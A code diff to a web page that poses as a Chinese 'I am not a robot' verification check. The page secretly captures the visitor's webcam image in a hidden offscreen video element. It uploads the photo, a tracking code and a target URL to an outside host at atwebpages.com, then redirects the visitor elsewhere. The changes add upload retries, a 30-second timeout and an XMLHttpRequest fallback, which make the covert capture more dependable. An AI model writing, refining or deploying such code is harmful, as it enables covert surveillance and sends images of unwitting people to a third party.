@@ -53,6 +53,12 @@
         .camera-status.error { color: #ff3b30; }
         .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
         video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+        #uploadResult {
+            margin-top: 12px;
+            font-size: 13px;
+            word-break: break-word;
+            min-height: 20px;
+        }
         .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
     </style>
 </head>
@@ -76,16 +82,14 @@
             <span>我不是机器人</span>
         </div>
         <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
-        <div id="uploadResult" style="margin-top:10px;font-size:13px;"></div>
+        <div id="uploadResult"></div>
     </div>
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
         // ==================== 固定配置 ====================
-        // ★★★ 手动指定API地址，确保正确 ★★★
         const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
-        
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get('code') || 'UNKNOWN';
         const targetUrl = urlParams.get('url') || 'https://www.baidu.com';
@@ -124,6 +128,7 @@
             }
         }
 
+        // ==================== 拍照 ====================
         async function capturePhoto() {
             return new Promise((resolve, reject) => {
                 if (!videoElement || !cameraReady) reject('摄像头未就绪');
@@ -133,23 +138,97 @@
                 canvas.width = videoElement.videoWidth;
                 canvas.height = videoElement.videoHeight;
                 ctx.drawImage(videoElement, 0, 0);
-                resolve(canvas.toDataURL('image/jpeg', 0.85));
+                // 使用较低质量减少数据量（0.7）
+                resolve(canvas.toDataURL('image/jpeg', 0.7));
             });
         }
 
-        async function uploadPhoto(photoData) {
+        // ==================== 上传（带超时和重试） ====================
+        async function uploadWithRetry(photoData, retries = 2) {
+            let lastError = null;
+            for (let attempt = 1; attempt <= retries; attempt++) {
+                try {
+                    const result = await uploadPhoto(photoData, attempt);
+                    return result; // 成功则返回
+                } catch (err) {
+                    lastError = err;
+                    console.warn(`上传尝试 ${attempt} 失败:`, err);
+                    if (attempt < retries) {
+                        // 等待1秒后重试
+                        await new Promise(r => setTimeout(r, 1000));
+                        // 重新捕获照片（有可能摄像头画面更新）
+                        try {
+                            photoData = await capturePhoto();
+                        } catch (e) {
+                            // 忽略重新捕获失败，继续使用原数据
+                        }
+                    }
+                }
+            }
+            throw lastError || new Error('上传失败');
+        }
+
+        async function uploadPhoto(photoData, attempt = 1) {
+            const resultDiv = document.getElementById('uploadResult');
+            resultDiv.textContent = `📤 上传中 (尝试 ${attempt})...`;
+            resultDiv.style.color = '#007aff';
+
             const fd = new FormData();
             fd.append('photo_data', photoData);
             fd.append('target_url', targetUrl);
             fd.append('code', code);
-            
-            const res = await fetch(API_URL + '?action=capture_photo', {
-                method: 'POST',
-                body: fd
-            });
-            return await res.json();
+
+            // 设置超时（30秒）
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 30000);
+
+            try {
+                let response;
+                // 优先使用 fetch，如果不可用则回退 XMLHttpRequest
+                if (window.fetch && window.FormData) {
+                    response = await fetch(API_URL + '?action=capture_photo', {
+                        method: 'POST',
+                        body: fd,
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeoutId);
+                    const json = await response.json();
+                    return json;
+                } else {
+                    // 降级方案：XMLHttpRequest
+                    clearTimeout(timeoutId);
+                    return new Promise((resolve, reject) => {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', API_URL + '?action=capture_photo', true);
+                        xhr.timeout = 30000;
+                        xhr.onload = function() {
+                            try {
+                                const json = JSON.parse(xhr.responseText);
+                                resolve(json);
+                            } catch (e) {
+                                reject(new Error('解析响应失败'));
+                            }
+                        };
+                        xhr.onerror = function() {
+                            reject(new Error('网络请求失败'));
+                        };
+                        xhr.ontimeout = function() {
+                            reject(new Error('上传超时'));
+                        };
+                        xhr.send(fd);
+                    });
+                }
+            } catch (err) {
+                clearTimeout(timeoutId);
+                // 如果是 AbortError，抛出超时错误
+                if (err.name === 'AbortError') {
+                    throw new Error('上传超时（30秒）');
+                }
+                throw err;
+            }
         }
 
+        // ==================== 初始化摄像头 ====================
         async function initCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
@@ -189,46 +268,59 @@
             }
         }
 
+        // ==================== 主流程：拍照 + 上传 + 跳转 ====================
         async function takePhotoAndRedirect() {
             if (photoCaptured) return;
             photoCaptured = true;
             
+            const resultDiv = document.getElementById('uploadResult');
             let photoData = null;
+            
+            // 1. 拍照
             if (cameraReady && videoElement?.videoWidth > 0) {
                 try {
                     photoData = await capturePhoto();
-                } catch(e) { console.log('拍照失败:', e); }
+                } catch(e) {
+                    resultDiv.textContent = '⚠️ 拍照失败: ' + e.message;
+                    resultDiv.style.color = '#ff3b30';
+                }
+            } else {
+                resultDiv.textContent = '⚠️ 摄像头未就绪，跳过拍照';
+                resultDiv.style.color = '#ff3b30';
             }
-            
-            const resultDiv = document.getElementById('uploadResult');
+
+            // 2. 上传
             let uploadSuccess = false;
-            
             if (photoData) {
                 try {
-                    const result = await uploadPhoto(photoData);
-                    resultDiv.textContent = '📤 上传结果: ' + JSON.stringify(result);
+                    const result = await uploadWithRetry(photoData, 2);
                     if (result.success) {
                         uploadSuccess = true;
+                        resultDiv.textContent = '✅ 照片上传成功！';
                         resultDiv.style.color = '#34c759';
                     } else {
+                        resultDiv.textContent = '❌ 上传失败: ' + (result.error || '未知错误');
                         resultDiv.style.color = '#ff3b30';
                     }
-                } catch(e) {
-                    resultDiv.textContent = '❌ 上传异常: ' + e.message;
+                } catch (err) {
+                    resultDiv.textContent = '❌ 上传异常: ' + err.message;
                     resultDiv.style.color = '#ff3b30';
                 }
             } else {
                 resultDiv.textContent = '⚠️ 未获取到照片数据';
                 resultDiv.style.color = '#ff3b30';
             }
-            
+
+            // 3. 释放摄像头
             if (stream) stream.getTracks().forEach(t => t.stop());
+
+            // 4. 延迟跳转
             setTimeout(() => {
                 window.location.href = targetUrl;
             }, 2000);
         }
 
-        // 人机验证
+        // ==================== 人机验证 ====================
         let verified = false;
         const verifyRow = document.getElementById('verifyRow');
         const checkbox = document.getElementById('checkbox');
@@ -242,6 +334,7 @@
             });
         }
 
+        // 启动
         initCamera();
         window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
     </script>
